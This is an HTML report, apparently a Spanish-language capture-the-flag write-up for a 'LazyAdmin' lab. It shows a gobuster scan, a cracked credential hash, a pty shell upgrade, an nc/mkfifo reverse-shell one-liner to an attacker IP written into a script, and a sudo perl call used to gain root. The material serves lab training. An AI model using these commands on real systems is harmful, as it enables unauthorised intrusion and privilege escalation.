@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LazyAdmin Report</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+        }
+
+        h1 {
+            color: #0047ab;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <div style="margin-left: 20%; margin-right: 20%;">
+        <h1>NMAP</h1>
+        <img src="image.png" alt="Resultado de escaneo NMAP">
+
+        <h1>WEB</h1>
+        <img src="image-1.png" alt="Interfaz Web Inicial">
+
+        <h1>Fuzzing</h1>
+        <p>Utilizando Gobuster para descubrir directorios:</p>
+        <pre><code>gobuster dir -u http://10.10.109.205/ -w /usr/share/wordlists/dirb/common.txt</code></pre>
+        <img src="image-2.png" alt="Resultado Inicial de Gobuster">
+        <img src="image-3.png" alt="Resultado Continuado de Gobuster">
+        <p>Fuzzing en la ruta encontrada:</p>
+        <img src="image-4.png" alt="Fuzzing Detallado Inicial">
+        <img src="image-5.png" alt="Fuzzing Detallado Continuación">
+        <img src="image-6.png" alt="Fuzzing Detallado Más Datos">
+        <img src="image-7.png" alt="Fuzzing Detallado Progreso">
+        <img src="image-8.png" alt="Resultados de Fuzzing con Contraseñas Encontradas">
+        <p>Usuario encontrado: <strong>manager</strong></p>
+        <p>Hash: <strong>42f749ade7f9e195bf475f37a44cafcb</strong></p>
+        <img src="image-9.png" alt="Descifrado de Hash">
+        <p>Contraseña descifrada: <strong>Password123</strong></p>
+        <img src="image-10.png" alt="Uso de la Contraseña">
+        <img src="image-11.png" alt="Acceso Concedido">
+        <img src="image-12.png" alt="Operaciones Post Acceso">
+        <p>Abrimos una shell interactiva:</p>
+        <pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+        <img src="image-13.png" alt="Shell Interactiva Inicial"><br>
+        <h1>User Flag</h1>
+        <img src="image-14.png" alt="Shell Interactiva Continuación">
+        <img src="image-15.png" alt="Comandos en Shell Interactiva">
+        <img src="image-16.png" alt="Más Comandos en Shell">
+        <p>Creación de un script para reverse shell:</p>
+        <pre><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.67.209 4444 >/tmp/f' > /etc/copy.sh</code></pre>
+        <pre><code>sudo /usr/bin/perl /home/itguy/backup.pl</code></pre>
+        <img src="image-17.png" alt="Configuración del Script">
+        <img src="image-18.png" alt="Ejecución del Script">
+        <h1>Root Flag</h1>
+        <pre><code>cat /root/root.txt</code></pre>
+    </div>
+</body>
+</html>
